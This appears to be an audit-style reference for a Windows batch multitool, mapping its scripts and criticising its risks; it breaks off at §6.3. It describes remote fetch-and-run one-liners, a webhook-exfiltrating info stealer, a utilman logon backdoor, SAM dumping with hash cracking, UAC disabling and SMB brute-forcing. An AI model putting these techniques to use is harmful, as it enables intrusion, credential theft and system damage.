# Schooi's Multitool (SMT) - Complete Documentation

> Reverse-engineered from the source repository `C:\Users\Schooi\Documents\GitHub\smt` (version **2.3**, label `d 2:19:48,38c3980`), authored by **Schooi#5942 (@schooi.)**, licensed **MIT**.
>
> This document is a full technical map of **every** script, state, feature, and function found in the toolkit. It is descriptive only.
>
> :warning:️ **Read the Security Assessment (§6) before running anything.** SMT is a batch-file multitool that, on purpose, bundles credential-stealer generators, brute-forcers, system-destroyer droppers, activation/trial bypasses, and pirate-game installers - several of which fetch and auto-run remote code with no integrity verification.

---

## 1. Overview

SMT is a **100% Windows batch-file** multitool targeting **Windows 10 & 11** (a few tools also branch for Windows 7). It ships **~116 `.bat` files** plus one compiled **NSIS installer** (`Schooi's Multitool Setup.exe`), a `config.json` (MegaTemp config), and assorted `.txt`/`.ini` support files.

The toolkit is driven by a single root launcher, `SchooiMultitool.bat`, which presents a categorized menu. Each menu entry `call`s a tool `.bat` located under `Files\` (apps live under `Files\Apps\`). Tools are heavily interdependent on a small set of shared helpers (`logo.bat`, `ini.bat`, `config\tc.bat`, `config\settings.ini`).

### Distribution
- Web one-liner (from README): `irm https://smt.gleeze.com/ | iex`
- `Installer.bat` -> compiles/runs the NSIS installer `Schooi's Multitool Setup.exe` (binary, flagged by antivirus as a dropper).
- `Uninstaller.bat` removes the install and self-deletes.

### First-run behavior (`setup.bat`)
On first run, `setup.bat` shows a disclaimer requiring the literal string **`I AGREE`**. It then drops a hidden + system marker file `needed_file.schm` into `C:\Program Files\Schooi's Multitool\` (or the USB root when running from removable media) and **self-deletes**. The launcher uses `needed_file.schm` as the proof-of-legitimate-install marker (an anti-piracy check, largely commented out in the current launcher).

---

## 2. Root launcher architecture (`SchooiMultitool.bat`)

The launcher is an 885-line batch file. It is the framework that ties everything together.

### 2.1 Command-line flags
| Flag | Long form | Effect |
|------|-----------|--------|
| `-d` | `--debug` | Enable debug mode (`%username%` + "On/Off" toggling) |
| `-rp` | `--restore-point` | Create a System Restore Point before launching |
| `-na` | `--noadmin` | Run without requesting administrator elevation |
| `-32` | `--system32` | Install SMT into `C:\Windows\System32` |
| `-pf` | `--program-files` | Install SMT into `C:\Program Files\Schooi's Multitool` |
| `-h` | `--help` | Show help |

### 2.2 Initialization sequence (in order)
1. Sets `vnum=2.3`.
2. Parses CLI flags.
3. Detects Windows version via `ver`; reads OS info from the registry (`ProductName`, `CurrentBuild`, `DisplayVersion`, `UBR`) and activation state via `slmgr`.
4. Sets console color from `config\settings.ini`.
5. If Windows >= 10 and "Terminal Text Coloring" is enabled, calls `config\tc.bat` to define ANSI color variables.
6. Sets PowerShell execution policy to **`Unrestricted`** for the current user.
7. Adds SMT to the PATH (HKLM or HKCU) if not already present.
8. Pings the internet; if reachable, sends an **anonymous usage ping** to `countapi.mileshilliard.com` (namespace `59422026`) once per install (recorded in `config\settings.ini` as `usagepingsent=true`).
9. Checks for updates by comparing local `Files/config/version` against the GitHub raw `version` file.
10. Resizes the console window (unless disabled).

### 2.3 States / labels
The launcher is a state machine. Recognized labels include:

`rpoint` (restore-point prompt) . `setup` . `compatibility` . `start` (main menu) . `info` . `calctools` . `history` . `pirated` . `color` . `secrets` . `credits` . `egbo` / `esgbo` / `sgbo` / `gbo` (menu-box drawing helpers) . `end` . `help` . `tools` (category selector) . `apps` . `danger` . `Network` . `fixes` . `cracks` . `sysadmin` . `utils` . `fun`.

### 2.4 Main menu (`start`)
```
1) Tools       2) Info       3) Credits       4) Feedback
```
Typing **`sc`** on the main menu unlocks **secret commands**:
`%username%On` / `%username%Off` (debug), `sc`, `99` (history), `32` (add to system32), `pf` (add to Program Files), `cl` (color), `tcon` / `tcoff` (text coloring), `mdon` / `mdoff` (resize), `shutdown` / `restart` / `bios`, `git`, `rs` (restart launcher), `edit`, `forceupd`.

### 2.5 Category -> tool map
The `tools` menu routes into categories. Tool numbers as shown in the launcher:

**Apps (1-41)** - `SuperF4, geek, cmd, ps, ps7, pswin7, fastfetch, git, wg, ctt, wintoys, pcm, flux, chrome, bts, firefox, 7z, telegram, mbam, npp, sharex, qbt, pdn, evt, gitd, uwt, rcv, pch, wat, dc, vc, ifv, plt, psm, skl, blip, cc, rdk, adk, w10wr4, rmt` (all under `Files\Apps\`).

**Danger Zone (1-8)** - `WDDL, InfoFinder, isg, dsf, tf, uacd, uta, Schnuker\install`.

**Network (1-12)** - `iplog, IPGeolocatorDL, pinger, ipv6, ednsc, SMBBruteforcer, wifipasses, stcli, hfb, nsl, trt` (and `IPStealer`, documented with the stealer cluster).

**Fixes (1-5)** - `SSAMBYO` (Set Shell to "This PC"), `GPEE` (Group Policy Editor Enable), `BR` (Backup Registry), `IB` (Import Backup - referenced by `rcmcreadme.txt`), `db` (disable/enable). *(Implementations of the Fixes entries are not individually present as standalone `.bat` files in the audited snapshot; the launcher references them.)*

**Cracks (1-5)** - `Malwarebytes-Premium-Reset, WA, fgrdown, zicrack, pc`.

**System Administration (1-14)** - `RAUP, taskmanager, busbc, aap, aig, rcmc, suc, autorespo, sysinfo, hibern, w11, systempropertiesperformance, UPPPE, Apps\ctt`.

**Utilities (1-13)** - `PasswordGenerator, URLShortener, fo, ascii, gradients, creds, emv2ae, bfc, rockyou, dflc, mcs, megatemp, PrivateFolderManager`.

**Fun (1-3)** - `speak` (text-to-speech), `CommandLineGame`, `sut` (School Utilities).

---

## 3. Framework & configuration files

| File | Role |
|------|------|
| `SchooiMultitool.bat` | Root launcher / state machine (see §2). |
| `logo.bat` (and `Files\Apps\logo.bat`, identical) | Prints the UTF-8 ASCII "Schooi's Multitool" banner on Win10+, ASCII fallback <= Win6. Called by nearly every tool. |
| `ini.bat` | 231-line batch/JScript hybrid **INI reader/writer**. Usage: `ini.bat /i <item> /v <value> /s <section> <file>` (query/create/modify) or `/d` to delete. Used by tools to read `config\settings.ini`. Credits a StackOverflow `rojo` snippet. |
| `setup.bat` | First-run setup -> drops `needed_file.schm`, self-deletes (see §1). |
| `config\tc.bat` | Defines ANSI color escape variables (`WHITE`, `Green`, `YELLOW`, `Cyan`, `Red`, `Gold`, `BRIGHT_*`, ...) and `GRADIENT_DISCORD/SCHOOI/YOUTUBE/GITHUB` identity strings + `GRADIENT_LINE`. **Bug:** line 22 appends literal text `GRADIENT_DISC` to the `BRIGHT_GREEN2` value. |
| `config\tcoff.bat` | Clears all color variables (disables coloring). |
| `creds.bat` | Stores accounts in `accs.txt` **unencrypted** (add/view/modify). |
| `config\settings.ini` | `[TerminalColor] hex=0f`; `[TerminalTextColoring] coloring=true`; `[TerminalResizing] resizing=false`; `[AddedToPath] smtinpath=true`; `[Telemetry] usagepingsent=true`. |
| `config\color.ini` | Deprecated remnant; contains `0f` plus a note from Schooi. |
| `config\version` | Update ID string (`d 2:19:48,38c3980`), compared against the GitHub raw copy for update checks. |
| `config\old_path.txt` | Backup of the original PATH when SMT was added to PATH. |
| `config.json` | **MegaTemp** config (`schemaVersion 3`): `accountFormat`, `csvExport`, `emailProvider: mailtm`, `encryptionPassword`, `executablePath: chrome`, `jsonlExport`, `mailTimeout: 45`, `maxAttempts: 4`, `proxy`, `quiet`, `visibleBrowser`, `webhookUrl`. (MegaTemp = a mega.nz mass-account manager.) |
| `Installer.bat` | NSIS-compiled binary; **unreadable** (triggers antivirus). The companion `.exe` downloads SMT files. |
| `Uninstaller.bat` | Removes SMT from `C:\Program Files\Schooi's Multitool\`, `C:\Windows\System32\SchooiMultitool.bat` + `SMT.bat` + `Files\`, deletes `needed_file.schm`, and **self-deletes**. |
| `updatelogs.txt` | "[300 COMMIT SPECIAL!] Huge re-organization of SchooiMultitool.bat ... simplified categories ..." |
| `ar.txt` | Embedded PowerShell (Chris Titus WinUtil) that creates a System Restore Point via `Checkpoint-Computer` (used by `autorespo`'s commented path / CTT). |
| `isgen.txt` / `isgen2.txt` | **Info Stealer Generator** templates - see §6.1. |
| `rcmcreadme.txt` | Right-Click Menu Changer readme (Windows 11 only; backup via `RB.bat`, restore via `IB.bat`). |
| `.github\workflows\codeql.yml` | 2-byte stub (placeholder). Plus issue templates (bug_report / feature_request). |

---

## 4. Recurring implementation patterns

These idioms recur across almost every tool and matter for understanding/auditing them:

- **Self-elevation:** `fltmc >nul 2>&1 || (PowerShell Start -Verb RunAs '%0' ...)` - re-launches the script as admin when not already elevated.
- **Logo header:** `if exist logo.bat call logo.bat & echo.`
- **Theme/color bootstrap:** detect Windows via `ver`, read `config\settings.ini` (`ini.bat /i coloring /s TerminalTextColoring`), and if Win10+ with coloring on, `call config\tc.bat`.
- **App install template (winget + IRM fallback):** most `Files\Apps\*.bat` run `winget install --accept-package-agreements --accept-source-agreements --disable-interactivity --force -e --id <ID>`; on failure they `irm <url> -OutFile %TEMP%\<x>installer.exe`, `start /WAIT` it, then `del` it.
- **No integrity verification:** **no script** checks a SHA256 hash or Authenticode signature before executing a downloaded binary. Supply-chain exposure is systemic.

---

## 5. Tool reference

### 5.1 Apps (`Files\Apps\`)

| Script | Installs | Method / Source |
|--------|----------|-----------------|
| `7z.bat` | 7-Zip | winget `7zip.7zip`; fallback `irm https://raw.githubusercontent.com/SchooiCodes/file_hosting/main/7z.ps1 \| iex` (remote PS1) |
| `adk.bat` | AnyDesk | winget `AnyDesk.AnyDesk`; fallback `download.anydesk.com/AnyDesk.exe` |
| `ait.bat` | **Generator** - writes a new installer `.bat` into `%USERPROFILE%\Downloads\%shortname%.bat` from 4 args (name, winget id, url, shortname). Can produce arbitrary installer droppers from any URL. |
| `blip.bat` | Blip (MS Store) | `get.microsoft.com/installer/download/9N7JSXC1SJK6` (no winget) |
| `bts.bat` | **BlockTheSpot** (Spotify no-ads) | `irm https://schooicodes.github.io/file_hosting/bts.ps1 \| iex` (remote PS1; violates Spotify ToS) |
| `cc.bat` | CapCut (+ "Pro for free") | winget `ByteDance.CapCut` or CapCut CDN; drops a PNG "how to get all Pro features for free" on the Desktop (ToS circumvention) |
| `chrome.bat` | Google Chrome | winget `Google.Chrome`; fallback `http://dl.google.com/chrome/install/375.126/chrome_installer.exe` (**http, not https**) |
| `ctt.bat` | Chris Titus WinUtil | **self-elevates**, then `irm https://christitus.com/win \| iex` (full remote tweaking suite, admin) |
| `dc.bat` | Discord | winget `Discord.Discord`; fallback Discord API installer |
| `evt.bat` | Everything (Voidtools) | **no winget**; pins old `Everything-1.4.1.1026.x86-Setup.exe` from voidtools.com |
| `fastfetch.bat` | Fastfetch | Installs **Scoop** then `scoop install fastfetch`; deliberately **de-elevates** via `runas /trustlevel:0x20000`; sets PS policy `RemoteSigned` |
| `firefox.bat` | Firefox | Downloads 2nd-stage `firefox.bat` from `schooicodes.github.io/file_hosting/firefox.bat`, `call`s it, then self-deletes the download |
| `flux.bat` | f.lux | winget `f.lux.f.lux`; fallback `justgetflux.com/flux-setup.exe` |
| `geek.bat` | Geek Uninstaller | winget -> `geek.zip` (Expand-Archive) -> Chocolatey bootstrap; **quarantined on disk by Windows Defender** in the audited snapshot (flag for review) |
| `git.bat` | Git for Windows | winget `git.git`; fallback pins `Git-2.41.0-64-bit.exe` |
| `gitd.bat` | GitHub Desktop | winget `GitHub.GitHubDesktop`; fallback `central.github.com/.../win32` |
| `ifv.bat` | IrfanView | winget `IrfanSkiljan.IrfanView`; fallback SourceForge |
| `logo.bat` | (shared banner, see §3) | |
| `mbam.bat` | Malwarebytes | winget `Malwarebytes.Malwarebytes`; fallback MB CDN `MBSetup.exe` |
| `npp.bat` | Notepad++ | winget `Notepad++.Notepad++`; fallback pins `npp.8.7.5.Installer.exe` |

**Apps part 2 (`Files\Apps\`):**

| Script | Installs | Method / Source |
|--------|----------|-----------------|
| `pch.bat` | Process Hacker 2 (2.39) | SourceForge mirror (no winget) |
| `pcm.bat` | Microsoft PC Manager | `Invoke-WebRequest https://schooicodes.github.io/file_hosting/PCManager.msix` -> App Installer (self-hosted, no signature check) |
| `pdn.bat` | Paint.NET 5.1.2 | winget `dotPDNLLC.paintdotnet`; fallback GitHub release |
| `plt.bat` | Playit.gg | winget `DevelopedMethods.playit`; fallback GitHub `.msi` (saved as `.exe`) |
| `ps7.bat` | PowerShell 7 | winget `Microsoft.PowerShell`; **calls `wg.bat`** to bootstrap winget if missing (potential race) |
| `psm.bat` | Prism Launcher 11.0.3 | winget `PrismLauncher.PrismLauncher`; fallback GitHub |
| `pswin7.bat` | PowerShell on Win7 (WMF 5.1) | `go.microsoft.com/fwlink/?linkid=839516` via `WebClient.DownloadFile` |
| `qbt.bat` | qBittorrent 5.0.3 | winget `Qbittorrent.Qbittorrent`; fallback SourceForge |
| `rcv.bat` | Recuva 1.54 | winget `Piriform.Recuva`; fallback `download.ccleaner.com` |
| `rdk.bat` | RustDesk 1.4.9 | **no winget** (stale claim); GitHub release |
| `rmt.bat` | Rainmeter 4.5.26 | winget `Rainmeter.Rainmeter`; fallback GitHub |
| `sharex.bat` | ShareX 17.0.0 | winget `ShareX.ShareX`; fallback GitHub |
| `skl.bat` | SKLauncher 4.0.36 | **no winget**; `github.com/sklauncher/binaries` (Minecraft cred-handling launcher) |
| `SuperF4.bat` | SuperF4 | winget `StefanSundin.Superf4`; fallback `schooicodes.github.io/file_hosting/SuperF4.exe` |
| `telegram.bat` | Telegram Desktop | **no winget**; `telegram.org/dl/desktop/win64` (always latest, nondeterministic) |
| `uwt.bat` | Ultimate Windows Tweaker | Picks UWT4/UWT5 by `CurrentBuild`; downloads `sfh.gleeze.com/UWT{4,5}.zip`, **extracts onto the Desktop**, runs every `.exe` in the folder |
| `vc.bat` | Vencord (Discord mod) | **no winget**; `github.com/Vencord/Installer/.../VencordInstaller.exe` (latest; violates Discord ToS) |
| `w10wr4.bat` | Win10 Widgets (Rainmeter 4.0) | **no winget**; `github.com/tjmarkham/win10widgets` |
| `wat.bat` | Winaero Tweaker | `winaerotweaker.com/download/winaerotweaker.zip`; `Expand-Archive`; runs every `.exe` silently (`/SP- /VERYSILENT`) |
| `wg.bat` | **winget bootstrapper** | `irm https://aka.ms/getwinget` -> installer; called by `ps7.bat`/`wintoys.bat` |
| `wintoys.bat` | WinToys | **self-elevates**; `winget install WinToys` (loose match, no `-e`/accept flags); async `start wg.bat` (race if winget missing) |

---

### 5.2 Network (`Files\`)

| Script | Purpose | Key behavior / externals | Risk |
|--------|---------|--------------------------|------|
| `iplog.bat` | Local IP logbook | Appends `name // IP // date-time` to `IPLogs.txt`; opens it on request. | Privacy: stores others' IPs+names. `if %name%==1` unquoted (space bug). |
| `IPGeolocatorDL.bat` | Runs prebuilt `IPGeolocator.exe` | `irm https://schooicodes.github.io/file_hosting/IPGeolocator.exe` (+Newtonsoft.dll), launches, then self-deletes. | **Supply-chain**: fetches & auto-runs a remote EXE with no hash check. |
| `pinger.bat` | Single + continuous pinger | `ping -n 1` reachability test. **Bug:** `goto top+-` targets a nonexistent label; `ping -t 1 0 10 127.0.0.1` is a malformed sleep. Unreachable Y/N exit blocks. | Low; minor rate-limit risk. |
| `ipv6.bat` | Disable/re-enable IPv6 (`--revert`) | Self-elevates; `netsh interface ipv6 set global randomizeidentifiers=disabled` + PowerShell `Disable-NetAdapterBinding -ComponentID ms_tcpip6`. | Breaks modern services (Teredo, M365, some VPNs). Admin. |
| `ednsc.bat` | Interactive DNS changer | Self-elevates; auto-detects active adapter; menu of Google/Cloudflare/OpenDNS/Quad9/AdGuard/NextDNS/custom/reset; NextDNS sets DoH. | Routes DNS through 3rd-party resolver (privacy). Admin. |
| `SMBBruteforcer.bat` | **SMB password brute-force** | Self-elevates; loops a wordlist calling `net use \\<ip> /user:<user> <pass>`; on success prints password. | **Illegal** credential attack; triggers lockouts. |
| `wifipasses.bat` | Reveal saved Wi-Fi passwords | `netsh wlan show profile name="<wifi>" key=clear`. | Privacy/ethics: cleartext Wi-Fi creds. `if /i %list%=="Y"` unquoted. |
| `stcli.bat` | Ookla Speedtest CLI | Downloads `ookla-speedtest-1.2.0-win64.zip`, extracts w/ 7-Zip (or fetches 7z from `schooicodes.github.io`), runs, then `rd /s /q ooklacli` (re-downloads every run). | Hardcoded win64 only. Minor supply-chain for 7z. |
| `hfb.bat` | Website blocker (HOSTS) | Writes `127.0.0.1 <domain>` to `C:\Windows\System32\drivers\etc\hosts`, `ipconfig /flushdns`. | Modifies protected system file; no backup. Admin. |
| `nsl.bat` | `nslookup` wrapper | Loops `nslookup <site>`. | Benign recon. |
| `trt.bat` | `tracert` wrapper | Loops `tracert <target>`. | Benign. |
| `IPStealer.bat` | Dump local `ipconfig` | `md IPs`, `ipconfig >> IP_Info_of_%username%.txt`. | Privacy: per-username LAN dossier; no exfil (but stealer-flavored). |

---

### 5.3 Danger Zone (`Files\`)

| Script | Purpose | Key behavior / externals | Risk |
|--------|---------|--------------------------|------|
| `WDDL.bat` | **Windows Destroyer** downloader | `irm https://schooicodes.github.io/file_hosting/WD.bat` -> `call WD.bat` -> `del WD.bat` (self-deletes the evidence). | **Extremely dangerous** hidden dropper; destructive payload lives off-box, unverifiable, auto-runs. |
| `dsf.bat` | Disk Space Filler | Floods disk with `0`-filled files up to a user byte count (`FilledSpace.txt`, then `Disk Space Filler\FilledSpace_*.txt`). | **Can fill disk to 100%** -> OS instability/instability. Menu (Spammer/Nullifier) is cosmetic. |
| `tf.bat` | Time Freezer | Self-elevates; infinite loop `date %date%` / `time %time%` every ~900 ms (`ping 1.1.1.1` as sleep). | Breaks TLS, 2FA, timestamps, scheduled tasks; must be killed manually; Admin. |
| `uacd.bat` | UAC Disabler (`--revert`) | Sets `HKLM\...\Policies\System\ConsentPromptBehaviorAdmin/User = 0` (revert -> 5/3) via `reg add`. | **Removes a core Windows security boundary**; any process gains admin silently. |
| `uta.bat` | **utilman Trick** | Self-elevates; `takeown`+`icacls` `utilman.exe` -> `ren utilman_old.exe`; `xcopy cmd.exe utilman.exe`. | **Logon-screen SYSTEM backdoor**; physical-access privilege escalation; modifies System32. |
| `Schnuker\install.bat` | Installs "Schnuker" (Discord Python tool) | Self-elevates; downloads `Schnuker.py` from `github.com/SchooiCodes/Schnuker`; ensures Python 3.13.1 (or installs it system-wide, forces logoff/restart); `pip install discord colorama asyncio`; runs `py Schnuker.py`. | Name + `discord` dep + unknown purpose -> possible token/account tool; remote code, no integrity check. |

---

### 5.4 Stealer / Recon cluster

| Script | Purpose | Key behavior / externals | Risk |
|--------|---------|--------------------------|------|
| `isg.bat` | **Info Stealer Generator** | Takes a Discord webhook (arg or prompt); downloads `isgen.txt`+`isgen2.txt` from GitHub raw; concatenates with `set webhook=<url>` into `%TEMP%\SCleaner.bat`; runs `bfo` obfuscator; moves **`SCleaner.bat` to `%USERPROFILE%\Downloads\`**. | **Generates obfuscated, webhook-exfiltrating malware** (§6.1). Illegal if deployed. |
| `InfoFinder.bat` | Bulk local recon | `md GrabbedInfo`; appends `ipconfig`, `net user`, `systeminfo`, `dir` of `C:\`, `Program Files`, `Program Files (x86)` into `<USERNAME>'s Info.txt`. | Comprehensive dossier; no exfil (but stealer-shaped). |
| `IPStealer.bat` | (see Network) | Local ipconfig dump. | - |

---

### 5.5 Cracks (`Files\`)

| Script | Purpose | Key behavior / externals | Risk |
|--------|---------|--------------------------|------|
| `Malwarebytes-Premium-Reset.bat` | Reset MB Premium trial | `taskkill` MB; self-elevates; spoofs `HKLM\SOFTWARE\Microsoft\Cryptography\MachineGuid` (random GUID) + creates a **persistent weekly scheduled task** to re-spoof. | Trial/license bypass (ToS); tampering with `MachineGuid` can break other software activation. |
| `WA.bat` | **Windows Activator** (MassGrave) | Self-elevates; `irm https://get.activated.win \| iex`. | Executes remote code as admin, no integrity check; **activation bypass violates Microsoft ToS**. |
| `fgrdown.bat` | **FitGirl Repacks** downloader/installer | Scrapes FitGirl list (Python `fgrscraper.py`), ensures qBittorrent + Python 3.13.1, downloads via magnet, **auto-runs every `*.exe` in the repack**. | **Software piracy**; auto-exec of downloaded EXEs (malware risk); drops a Startup helper in one path. |
| `zicrack.bat` | **.zip password cracker** | Requires 7-Zip; loops a wordlist through `7z.exe x -p%pass%`. **Bug:** `if errorlevel 0` is always true -> reports success on the first attempt and exits (effectively broken). | Dual-use; on archives you don't own = illegal. |
| `pc.bat` | **Windows Password Cracker (WSL)** | Two modes: **Victim** dumps `SAM`/`SYSTEM` (`reg save`), optionally enables RDP + Pass-the-Hash; **Attacker** installs Kali WSL, `impacket-secretsdump`, `hashcat -m 1000` to crack NTLM, writes `pass.txt`. | **Serious offensive tool**: SAM dump + RDP/PtH enablement + hash cracking. Illegal off-owned machines. |

---

### 5.6 System Administration (`Files\`)

| Script | Purpose | Key behavior / externals | Risk / notes |
|--------|---------|--------------------------|--------------|
| `RAUP.bat` | User account manager | Self-elevates; `net user` list/info, `net user <u> *` **password reset w/o old pw**, `wmic` rename + profile-folder rename. | Account-takeover capable; uses deprecated `wmic`; profile-folder rename can break profile. |
| `taskmanager.bat` | CLI task manager | `tasklist` / `taskkill /f /im` / `start`. **Bug:** the PID-kill fallback `taskkill /f /t /PID` has no PID argument (broken). | Force-kill by name. |
| `busbc.bat` | Bootable USB creator (Ventoy) | Self-elevates; `irm https://schooicodes.github.io/file_hosting/ventoy-1.0.99-windows.zip`, `Expand-Archive`, `Ventoy2Disk.exe /I`. | **Destructive** (wipes chosen USB); remote binary, no hash. Blocks drive `C` only. |
| `aap.bat` | Any-app winget installer | `winget install ... --id %id%` in a loop. | Unvalidated `%id%` passed to winget; no elevation. |
| `aig.bat` | App Installer Generator | Downloads `Apps\ait.bat` from GitHub raw if missing; calls it to emit a one-click installer into Downloads. | Remote script (no pin) first-run. |
| `rcmc.bat` | Right-Click Menu Changer | Toggles Win10/Win11 context menu via `{86ca1aa0-34aa-4e8b-a509-50c905bae2a2}` reg key; restarts Explorer. **Bug:** `if ERRORLEVEL 0 echo Something went wrong!` is inverted (fires on success). | Low; shell registry edit. |
| `suc.bat` | Error scanner | Self-elevates; runs `sfc /scannow`, `DISM /Cleanup-Image` (CheckHealth/ScanHealth/RestoreHealth), `chkdsk /f` & `/r`. | May schedule reboot for system drive. |
| `autorespo.bat` | Restore Point creator | **Lowers PS execution policy to `Unrestricted`**; self-elevates; `irm https://schooicodes.github.io/file_hosting/autorespo.ps1 \| iex`. | **Remote PS1 straight to `iex`** (full RCE); weakens PS policy. |
| `sysinfo.bat` | `systeminfo` dump | Read-only. | None. |
| `hibern.bat` | Enable/disable hibernation | `powercfg /hibernate on|off`. | Toggles `hiberfil.sys`. |
| `w11.bat` | Windows 11 tweaker | Reg stanzas for old menu, ribbon, Win10 taskbar, etc.; option 7 downloads & runs `Win11DisableOrRestoreRoundedCorners.exe` from `schooicodes.github.io`. **Bug:** `:revert` writes the Search entry to `tweaks.reg` instead of `revert.reg`. | Modifies HKLM; remote EXE no hash; revert bug. |
| `UPPPE.bat` | Ultimate Performance power plan | `powercfg -duplicatescheme e9a42b02-...`. **Bug:** `if "%ERRORLEVEL%"="0"` is a string compare, not an errorlevel test (unreliable). | Minor. |
| `s32.bat` | Install into System32 | Self-elevates; requires `I AGREE`; copies tool into `C:\Windows\System32\`, creates `SMT.bat`, `icacls ... /grant %USERNAME%:F` (**full control** in system32). | Drops files into protected dir + broad ACL. |
| `pf.bat` | Install into Program Files | Self-elevates; `xcopy` to `C:\Program Files\Schooi's Multitool\`; builds a random-named VBScript to drop a Desktop `.lnk`. | Standard installer; lower risk than `s32`. |
| `restart.bat` | Return to launcher | `cd ..` & `call SchooiMultitool.bat`. | None. |
| `add_exclusion.bat` | Defender exclusion | Self-elevates; `Add-MpPreference -ExclusionPath '%TEMP%\SMT\SMTSetup.exe'`. | **Weakens AV** - files under that path won't be scanned. |

---

### 5.7 Utilities (`Files\`)

| Script | Purpose | Key behavior / externals | Risk / notes |
|--------|---------|--------------------------|--------------|
| `PasswordGenerator.bat` | Random password | `%random%`-based (non-cryptographic); optionally copies to clipboard. | Weak RNG; no input validation. |
| `URLShortener.bat` | TinyURL shortener | `curl https://tinyurl.com/api-create.php?url=%url%`. | URL passed unescaped; `ERRORLEVEL 0` always "Success". |
| `fo.bat` | Folder organizer | `move`s files into extension-named subfolders. | Operates in-place; infinite loop. |
| `ascii.bat` | ASCII art redirect | `start https://fsymbols.com/text-art/`. | Harmless. |
| `gradients.bat` | ANSI gradient art maker | Builds batch templates wrapping 6 art lines in ANSI codes; writes `%TEMP%\inputs.bat`. | `goto %choice%` injectable. |
| `emv2ae.bat` | Force Chrome MV2 (uBlock etc.) | Self-elevates; `reg add HKLM\...\Policies\Google\Chrome /v ExtensionManifestV2Availability /d 2`. | System-wide policy change; bypasses a deliberate browser security change. |
| `bfc.bat` | Batch file scaffold | Writes `Placeholder text` into `<title>.bat`, opens Notepad. | Harmless. |
| `rockyou.bat` | Download `rockyou.txt` | `irm https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt`. | Downloads a well-known cracking wordlist. |
| `dflc.bat` | LOC counter | Uses external `cloc`; opens its GitHub if missing. | Needs `cloc` preinstalled. |
| `mcs.bat` | **Minecraft server creator** | Self-elevates; installs Java 25 (Adoptium) + Playit.gg; downloads Vanilla/Paper/Fabric 26.2 jar; **auto-accepts Mojang EULA** (`eula=true`); writes `server.properties`, startup scripts, Desktop shortcuts; pulls `plt.bat` + icons from `sfh.gleeze.com`. | Auto-EULA acceptance; runs third-party `sfh.gleeze.com/plt.bat` non-interactively. |
| `megatemp.bat` | **MegaTemp** launcher | Downloads `MegaTemp-windows.exe` from `github.com/SchooiCodes/MegaTemp/releases/latest` and runs it. | Executes precompiled binary of unknown provenance (mega.nz mass accounts). |
| `PrivateFolderManager.bat` | Hide folder as Control Panel CLSID | Renames folder to `Control Panel.{21EC2020-...}`, `+h +s`; **password stored in plaintext** in `%appdata%\PrivateFolderManager\`. | Security-through-obscurity; plaintext password. |
| `listviewer.bat` | FitGirl list viewer/auto-install | Reads `pages\*.txt`, writes `..\auto-install.txt`, launches `fgrdown.bat`. | **Piracy helper**; depends on external data files. |
| `cm.bat` | Clipboard manager | `powershell Get-Clipboard` -> `clipboard_history.txt`. | Stores potentially sensitive clipboard in plaintext; counter resets each run. |
| `fic.bat` | File integrity checker | `certutil -hashfile` generate/verify (MD5/SHA1/SHA256). | Read-only. |
| `bfo.bat` | **Batch obfuscator/binder** | Base64-decodes a `cls` prefix via `certutil -decode`, then `copy prefix + orig` into `<name>___.bat`. | Obfuscation technique that can conceal payloads; used by `isg.bat`. |
| `ss.bat` | Screenshot to PNG | PowerShell `System.Windows.Forms`/`System.Drawing` capture (primary monitor). | Captures screen to file. |
| `music.bat` | Rickroll cleanup watcher | Loops `tasklist` for the rickroll window; when gone, `taskkill cscript` + deletes `music.mp3`/`sound.vbs`/`start.vbs`. | Infinite poll; kills all `cscript.exe`. |
| `mystery.bat` | Rickroll trigger | Downloads `music.mp3` from `schooicodes.github.io/file_hosting`, writes `start.vbs`/`sound.vbs` (WMPlayer), runs `curl ascii.live/rick`. | Harmless prank; uses WSH/VBS. |
| `sut.bat` | School Utilities | Opens "unblocked" game sites (friv, Tyrone's) + prank sites (hackertyper, geekprank). | Designed to bypass school web filters. |
| `mcss.bat` | MC server launcher template | Starts `playit` + Java server; copied by `mcs.bat` and appended with the real launch command. | Template only. |

---

### 5.8 Fun (`Files\`)

- `speak` - text-to-speech wrapper (PowerShell `Speech.Synthesis`).
- `CommandLineGame` - a small built-in command-line game.
- `sut.bat` - see Utilities (school unblocked-game/prank launcher).
- `ascii.bat`, `gradients.bat`, `music.bat`, `mystery.bat` - see Utilities (art/prank).

---

## 6. Security assessment

SMT is **not** a benign utilities collection. It deliberately bundles tooling spanning the full legality/ethics spectrum. The dominant themes:

### 6.1 Information-stealing malware (the most serious)
`isg.bat` (Info Stealer Generator) assembles `SCleaner.bat` from `isgen.txt` + `isgen2.txt` and **obfuscates** it with `bfo`, dropping the result into the victim's `Downloads`. The `isgen2.txt` payload, when run, **collects and exfiltrates** to a Discord webhook via `curl -k`:
- `ipconfig` (full LAN config), `systeminfo`, Windows **license key** (`BackupProductKeyDefault`),
- directory listings of `C:\`, `Program Files`, `%USERPROFILE%\Documents`, `%USERPROFILE%\Desktop`,
- `net user`, `netstat -an` open ports, **Wi-Fi profiles with CLEAR-TEXT KEYS** (`netsh wlan export ... key=clear`),
- a **screenshot** (via `npocmaka/batch.scripts` screenCapture),
- **browser passwords** recovered with `WebBrowserPassView.exe`,
- packaged into `info.zip` + `passwords.zip` and posted to `%WEBHOOK%`.

Building, distributing, or running this against any machine without explicit consent is a serious crime (computer misuse, unauthorized access, privacy violation). `IPStealer.bat` and `InfoFinder.bat` are the non-exfiltrating recon variants of the same idea.

### 6.2 Supply-chain / remote-code execution with no integrity check
Many scripts fetch and **immediately execute** remote code or binaries, none of which are hash/signature verified:
- `WDDL.bat` -> `schooicodes.github.io/file_hosting/WD.bat` (then deletes it)
- `WA.bat` -> `get.activated.win | iex`
- `autorespo.bat` -> `.../autorespo.ps1 | iex` (also lowers PS policy to `Unrestricted`)
- `7z.bat`, `bts.bat`, `firefox.bat`, `pcm.bat`, `SuperF4.bat` -> author-hosted `schooicodes.github.io` / `SchooiCodes/file_hosting`
- `ctt.bat` -> `christitus.com/win | iex`
- `isg.bat` -> GitHub raw `isgen.txt`/`isgen2.txt`
- `uwt.bat`, `wat.bat`, `mcs.bat` -> third-party `sfh.gleeze.com`
- `Schnuker\install.bat`, `fgrdown.bat` -> GitHub `SchooiCodes/*`

Because these hosts are personal/third-party and unpinned, a compromise (or a malicious repo change) would execute arbitrary code on every user's machine with no detection.

### 6.3 Destructive / security-downgrade tools
